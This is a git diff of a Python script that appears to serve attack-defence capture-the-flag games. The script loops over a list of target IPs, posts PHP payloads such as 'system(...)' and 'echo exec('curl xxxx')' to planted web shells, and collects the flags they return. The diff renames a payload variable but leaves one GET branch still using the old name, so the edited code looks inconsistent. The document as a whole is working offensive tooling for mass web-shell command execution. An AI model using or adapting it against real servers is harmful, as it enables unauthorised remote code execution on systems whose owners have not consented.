@@ -8,19 +8,19 @@ datas=''
 url=''
 command=''
 # Example:POST_data={'x':"system('curl xxxx');"}
-POST_file = "system('curl xxxx');"
+#POST_file = "system('curl xxxx');"
 
 # Example:GET_data="echo exec('curl xxxx');"
-GET_file = "echo exec('curl xxxx');"
+eval_file = "echo exec('curl xxxx');"
 
 exec_file = "curl xxxx"
 
 #设置获取flag的命令
 def set_command(command):
     cmd="'"+command+"'"
-    global POST_file,GET_file,exec_file
-    POST_file="system(%s);"%cmd
-    GET_file="echo exec(%s);"%cmd
+    global POST_file,eval_file,exec_file
+    #POST_file="system(%s);"%cmd
+    eval_file="echo exec(%s);"%cmd
     exec_file=command
 
 
@@ -39,7 +39,7 @@ def get_flag(ip_list):
     for i in ip_list:
         urls = "http://" + i
         for j in POST_eval_shells_path_pwd:
-            evel_POST_data = {POST_eval_shells_path_pwd[j]:POST_file}
+            evel_POST_data = {POST_eval_shells_path_pwd[j]:eval_file}
             url = "http://" + i + j
             try:
                 flag = requests.post(url,data = evel_POST_data)
@@ -51,7 +51,7 @@ def get_flag(ip_list):
             url = "http://" + i + k
             try:
                 if '?' in k:
-                    flag=requests.get(url+'&'+GET_eval_shells_path_pwd[k] + "=" + GET_file)
+                    flag=requests.get(url+'&'+GET_eval_shells_path_pwd[k] + "=" + eval_file)
                 else:
                     flag = requests.get(url +"?"+ GET_eval_shells_path_pwd[k] + "=" + GET_file)
                 judege(flag)
